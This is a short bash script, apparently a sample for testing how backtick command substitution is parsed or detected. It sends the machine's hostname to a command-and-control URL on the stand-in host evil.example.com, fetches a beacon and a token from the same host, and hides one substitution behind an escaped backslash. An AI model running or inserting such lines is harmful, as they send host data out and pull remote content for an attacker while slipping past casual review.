#!/bin/bash
HOSTNAME=`hostname`
RESULT=`curl http://evil.example.com/c2 -d "$HOSTNAME"`
echo "$RESULT"
echo "Beacon: `curl -s http://evil.example.com/beacon`"
# An escaped backslash leaves the backtick after it active.
TOKEN="\\`curl -s http://evil.example.com/token`"
